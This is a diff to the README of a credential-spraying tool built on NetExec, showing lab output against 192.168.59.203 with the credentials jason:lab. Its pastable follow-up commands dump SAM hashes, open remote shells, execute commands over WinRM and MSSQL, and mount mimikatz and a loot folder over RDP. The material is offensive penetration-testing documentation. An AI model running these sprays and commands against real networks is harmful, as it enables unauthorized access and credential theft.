@@ -143,22 +143,23 @@ Hits only. Failures, banners, and nxc chatter stay in the log.
 [*] Verbose log: nxcblast_20260902_224305.log
 [*] Ctrl+C skips this target during a pause; Ctrl+C otherwise stops the spray
 
-    PROTO  | TARGET           | CREDS                  | ACCESS
+    PROTO  | TARGET           | CREDS                  | METHOD   | ACCESS
 
-[+] SMB    | 192.168.59.203   | jason:lab              | (valid)
-[+] RDP    | 192.168.59.203   | jason:lab              | (Pwn3d!) RDP code exec
-[+] WMI    | 192.168.59.203   | jason:lab              | (valid)
+[+] SMB    | 192.168.59.203   | jason:lab              | domain   | (valid)
+[+] RDP    | 192.168.59.203   | jason:lab              | local    | (Pwn3d!) RDP code exec
+[+] MSSQL  | 192.168.59.203   | jason:lab              | mssql    | (valid)
+[+] WMI    | 192.168.59.203   | jason:lab              | domain   | (valid)
 
 [*] Done. 3 hits across 1 target.
 ```
 
-`(valid)` is green. `(Pwn3d!)` is bright red, with a short protocol-specific meaning (local admin, remote shell, sysadmin role, and so on). FTP never shows `Pwn3d!`. Lockout pauses are silent on the console (logged only).
+`(valid)` is green. `(Pwn3d!)` is bright red, with a short protocol-specific meaning (local admin, remote shell, sysadmin role, and so on). FTP never shows `Pwn3d!`. METHOD is `domain` or `local` on Windows protocols, and `windows` / `mssql` / `internal` for MSSQL. Lockout pauses are silent on the console (logged only).
 
 Hit detection reads `nxc` stdout (exit codes are ignored): `[+]`, `Pwn3d!`, `STATUS_SUCCESS`, `(Shell)`. Lines with `STATUS_LOGON_FAILURE`, `STATUS_ACCESS_DENIED`, or `[-]` are dropped.
 
 ## Pastables
 
-`nxcblast` never auto-runs enum or dump modules. At the end of every run it prints paste-ready follow-up commands for each confirmed hit, adapted to protocol and whether the secret is a password or an NTLM hash.
+`nxcblast` never auto-runs enum or dump modules. At the end of every run it prints paste-ready follow-up commands for each confirmed hit, matching the auth method that actually succeeded (`--local-auth` only when local/mssql local worked).
 
 ```
 ============================================================
@@ -167,20 +168,21 @@ PASTABLES -- confirmed hits, suggested follow-up commands
 
 [192.168.59.203 | jason:lab]
 
-[SMB]
+[SMB domain]
   nxc smb 192.168.59.203 -u jason -p 'lab' --shares
   nxc smb 192.168.59.203 -u jason -p 'lab' --rid-brute
   nxc smb 192.168.59.203 -u jason -p 'lab' --sam
-  nxc smb 192.168.59.203 -u jason -p 'lab' --local-auth --shares
 
-[WINRM]
+[WINRM local]
   evil-winrm -i 192.168.59.203 -u jason -p 'lab'
+  nxc winrm 192.168.59.203 -u jason -p 'lab' --local-auth -x whoami
 
-[RDP]
-  xfreerdp /u:jason /p:'lab' /v:192.168.59.203 /cert:ignore
+[RDP domain]
+  mkdir -p "$HOME/my_data/loot"; xfreerdp3 /clipboard /dynamic-resolution /cert:ignore /drive:'/usr/share/windows-resources/mimikatz/x64',share /drive:"$HOME/my_data/loot",loot /v:192.168.59.203 /d: /u:jason /p:'lab'
 
-[WMI]
-  nxc wmi 192.168.59.203 -u jason -p 'lab' -x whoami
+[MSSQL mssql]
+  nxc mssql 192.168.59.203 -u jason -p 'lab' --local-auth
+  nxc mssql 192.168.59.203 -u jason -p 'lab' --local-auth -x whoami
 ============================================================
 ```
 
